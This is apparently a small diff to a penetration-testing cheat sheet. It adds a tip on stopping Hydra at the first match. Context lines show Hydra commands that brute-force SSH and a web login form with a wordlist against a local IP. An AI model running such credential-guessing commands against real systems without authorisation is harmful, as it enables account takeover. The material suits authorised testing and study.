@@ -1,3 +1,4 @@
+Add `-F` to stop Hydra on the first match
 ## SSH
 
 ```bash
@@ -15,3 +16,5 @@ hydra -C pass.txt x.x.x.x ssh -V
 ```bash
 hydra -l kevin -P /opt/rockyou.txt 192.168.0.181 http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -VV -F -I
 ```
+
+
